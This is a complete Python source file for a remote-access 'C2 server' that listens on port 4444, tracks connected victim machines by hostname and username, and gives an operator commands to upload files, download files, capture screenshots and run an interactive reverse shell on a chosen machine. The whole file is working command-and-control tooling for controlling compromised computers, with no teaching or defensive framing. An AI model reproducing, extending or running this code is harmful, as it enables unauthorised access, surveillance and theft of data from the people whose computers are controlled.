import socket
import threading
import os
import time
import base64
from datetime import datetime

class C2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.clients = {}  
        self.commands = {
            'help': self.show_help,
            'list': self.list_clients,
            'select': self.select_client,
            'upload': self.upload_file,
            'download': self.download_file,
            'screenshot': self.take_screenshot,
            'shell': self.reverse_shell,
            'exit': self.exit_client,
            'quit': self.quit_server
        }
        self.current_client = None
        
    def start(self):
        try:
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            print(f"[+] C2 Server started on {self.host}:{self.port}")
            print("[+] Waiting for incoming connections...")
            
           
            threading.Thread(target=self.accept_connections, daemon=True).start()
            
            
            self.command_loop()
            
        except Exception as e:
            print(f"[!] Server error: {e}")
        finally:
            self.server_socket.close()
    
    def accept_connections(self):
        while True:
            try:
                client_socket, address = self.server_socket.accept()
                print(f"[+] Connection from {address[0]}:{address[1]} - waiting for client info...")
                
               
                client_socket.settimeout(10)
                hostname = client_socket.recv(1024).decode('utf-8', errors='ignore')
                username = client_socket.recv(1024).decode('utf-8', errors='ignore')
                
                
                client_id = f"{len(self.clients) + 1}"
                
                
                self.clients[client_id] = {
                    'socket': client_socket,
                    'address': address,
                    'hostname': hostname,
                    'username': username,
                    'connected_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
                
                print(f"[+] New connection from {address[0]}:{address[1]} ({hostname}/{username}) - ID: {client_id}")
                
                
                try:
                    client_socket.sendall("Connection established with C2 server.".encode())
                except:
                    print(f"[!] Error sending acknowledgement to client {client_id}")
                    
            except socket.timeout:
                print(f"[!] Client connection timed out while waiting for information")
                try:
                    client_socket.close()
                except:
                    pass
            except Exception as e:
                print(f"[!] Error accepting connection: {e}")
    
    def command_loop(self):
        while True:
            try:
                if self.current_client:
                    client_id = self.current_client
                    hostname = self.clients[client_id]['hostname']
                    cmd_input = input(f"C2({hostname})> ").strip()
                else:
                    cmd_input = input("C2> ").strip()
                
                if not cmd_input:
                    continue
                
                parts = cmd_input.split(' ', 1)
                command = parts[0].lower()
                args = parts[1] if len(parts) > 1 else ""
                
                if command in self.commands:
                    self.commands[command](args)
                else:
                    if self.current_client:
                        self.send_command(command, args)
                    else:
                        print("[!] No client selected. Use 'select <id>' to choose a client.")
                        
            except KeyboardInterrupt:
                print("\n[!] Ctrl+C pressed. Use 'quit' to exit the server.")
            except Exception as e:
                print(f"[!] Error in command loop: {e}")
    
    def show_help(self, args):
        """Display available commands"""
        help_text = """
        Command & Control Server Commands:
        =================================
        help                  - Show this help menu
        list                  - List all connected clients
        select <id>           - Select a client by ID
        upload <src> <dst>    - Upload a file to the client
        download <src> <dst>  - Download a file from the client
        screenshot <path>     - Take a screenshot on the client
        shell                 - Start a reverse shell session
        exit                  - Disconnect from the current client
        quit                  - Exit the C2 server
        """
        print(help_text)
    
    def list_clients(self, args):
        """List all connected clients"""
        if not self.clients:
            print("[!] No clients connected.")
            return
        
        print("\nConnected Clients:")
        print("=================")
        print(f"{'ID':<5}{'IP':<15}{'Port':<8}{'Hostname':<20}{'Username':<20}{'Connected Time'}")
        print("-" * 80)
        
        for client_id, client_info in self.clients.items():
            ip, port = client_info['address']
            print(f"{client_id:<5}{ip:<15}{port:<8}{client_info['hostname']:<20}{client_info['username']:<20}{client_info['connected_time']}")
        print()
    
    def select_client(self, args):
        """Select a client to interact with"""
        if not args:
            print("[!] Usage: select <id>")
            return
        
        client_id = args
        if client_id not in self.clients:
            print(f"[!] Client ID {client_id} not found.")
            return
        
        
        try:
            self.clients[client_id]['socket'].settimeout(5)
            self.clients[client_id]['socket'].sendall("ping".encode())
            response = self.clients[client_id]['socket'].recv(1024)
        except:
            print(f"[!] Client {client_id} appears to be disconnected.")
            self._remove_client(client_id)
            return
        
        self.current_client = client_id
        hostname = self.clients[client_id]['hostname']
        print(f"[+] Now interacting with {hostname} (ID: {client_id})")
    
    def send_command(self, command, args=""):
        """Send a command to the selected client"""
        try:
            if not self.current_client:
                print("[!] No client selected.")
                return
            
            client_socket = self.clients[self.current_client]['socket']
            full_command = f"{command} {args}".strip()
            
            print(f"[*] Sending command: {full_command}")
            client_socket.sendall(full_command.encode())
            
            if command not in ['shell']:
                client_socket.settimeout(30)  
                response = client_socket.recv(4096)
                print(response.decode('utf-8', errors='ignore'))
                
        except socket.timeout:
            print(f"[!] Command timed out. Client may be busy or unresponsive.")
        except Exception as e:
            print(f"[!] Error sending command: {e}")
            self._remove_client(self.current_client)
    
    def upload_file(self, args):
        """Upload a file to the client"""
        try:
            if not args:
                print("[!] Usage: upload <source_path> <destination_path>")
                return
                
            if not self.current_client:
                print("[!] No client selected.")
                return
                
            parts = args.split(' ', 1)
            if len(parts) != 2:
                print("[!] Usage: upload <source_path> <destination_path>")
                return
                
            src_path, dst_path = parts
                
            if not os.path.isfile(src_path):
                print(f"[!] Source file '{src_path}' not found.")
                return
                
            client_socket = self.clients[self.current_client]['socket']
            client_socket.sendall(f"upload {dst_path}".encode())
            
            client_socket.settimeout(10)
            response = client_socket.recv(1024).decode()
            if response != "READY":
                print(f"[!] Client error: {response}")
                return
            
            with open(src_path, 'rb') as file:
                file_data = file.read()
                
            client_socket.sendall(str(len(file_data)).encode())
            time.sleep(0.5)  
            
            response = client_socket.recv(1024).decode()
            if response != "READY":
                print(f"[!] Client error: {response}")
                return
                
            client_socket.sendall(file_data)
            
            client_socket.settimeout(30) 
            response = client_socket.recv(1024).decode()
            print(response)
            
        except Exception as e:
            print(f"[!] Upload error: {e}")
    
    def download_file(self, args):
        """Download a file from the client"""
        try:
            if not args:
                print("[!] Usage: download <source_path> <destination_path>")
                return
                
            if not self.current_client:
                print("[!] No client selected.")
                return
                
            parts = args.split(' ', 1)
            if len(parts) != 2:
                print("[!] Usage: download <source_path> <destination_path>")
                return
                
            src_path, dst_path = parts
            
            client_socket = self.clients[self.current_client]['socket']
            client_socket.sendall(f"download {src_path}".encode())
            
            client_socket.settimeout(10)
            response = client_socket.recv(1024).decode()
            if response.startswith("ERROR"):
                print(f"[!] {response}")
                return
                
            file_size = int(response)
            client_socket.sendall("READY".encode())
            
            file_data = b""
            remaining = file_size
            client_socket.settimeout(60) 
            
            while remaining > 0:
                chunk = client_socket.recv(min(4096, remaining))
                if not chunk:
                    break
                file_data += chunk
                remaining -= len(chunk)
            
            with open(dst_path, 'wb') as file:
                file.write(file_data)
                
            print(f"[+] File downloaded successfully and saved to '{dst_path}' ({file_size} bytes)")
            
        except Exception as e:
            print(f"[!] Download error: {e}")
    
    def take_screenshot(self, args):
        """Take a screenshot on the client machine"""
        if not self.current_client:
            print("[!] No client selected.")
            return
            
        save_path = args if args else f"screenshot_{int(time.time())}.png"
        
        client_socket = self.clients[self.current_client]['socket']
        client_socket.sendall(f"screenshot".encode())
        
        client_socket.settimeout(30)  
        response = client_socket.recv(1024).decode()
        if response.startswith("ERROR"):
            print(f"[!] {response}")
            return
            
        screenshot_size = int(response)
        client_socket.sendall("READY".encode())
        
        screenshot_data = b""
        remaining = screenshot_size
        client_socket.settimeout(60)
        
        while remaining > 0:
            chunk = client_socket.recv(min(4096, remaining))
            if not chunk:
                break
            screenshot_data += chunk
            remaining -= len(chunk)
        
        with open(save_path, 'wb') as file:
            file.write(screenshot_data)
            
        print(f"[+] Screenshot saved to '{save_path}' ({screenshot_size} bytes)")
    
    def reverse_shell(self, args):
        """Start a reverse shell session with the client"""
        if not self.current_client:
            print("[!] No client selected.")
            return
            
        client_socket = self.clients[self.current_client]['socket']
        client_socket.sendall("shell".encode())
        
        print("[+] Starting reverse shell session (type 'exit' to end)")
        
        try:
            while True:
                command = input("shell> ")
                
                if command.lower() == "exit":
                    client_socket.sendall("exit_shell".encode())
                    break
                    
                client_socket.sendall(command.encode())
                
                client_socket.settimeout(30)  
                response = client_socket.recv(4096).decode('utf-8', errors='ignore')
                print(response)
                
        except Exception as e:
            print(f"[!] Shell error: {e}")
            
    def exit_client(self, args):
        """Exit the current client session"""
        if not self.current_client:
            print("[!] No client currently selected.")
            return
            
        print(f"[+] Exiting session with client {self.current_client}")
        self.current_client = None
    
    def quit_server(self, args):
        """Shutdown the C2 server"""
        print("[+] Shutting down C2 server...")
        
        for client_id, client_info in list(self.clients.items()):
            try:
                client_info['socket'].sendall("disconnect".encode())
                client_info['socket'].close()
            except:
                pass
        
        self.server_socket.close()
        print("[+] C2 server shutdown complete.")
        os._exit(0)
    
    def _remove_client(self, client_id):
        """Remove a disconnected client"""
        if client_id in self.clients:
            try:
                self.clients[client_id]['socket'].close()
            except:
                pass
            
            del self.clients[client_id]
            print(f"[!] Client {client_id} has been removed (disconnected).")
            
            if self.current_client == client_id:
                self.current_client = None

if __name__ == "__main__":
    print("""
    ╔════════════════════════════════════════════════╗
    ║                 C2 SERVER v1.0                 ║
    ╚════════════════════════════════════════════════╝
    Type 'help' to see available commands
    """)
    server = C2Server()
    server.start()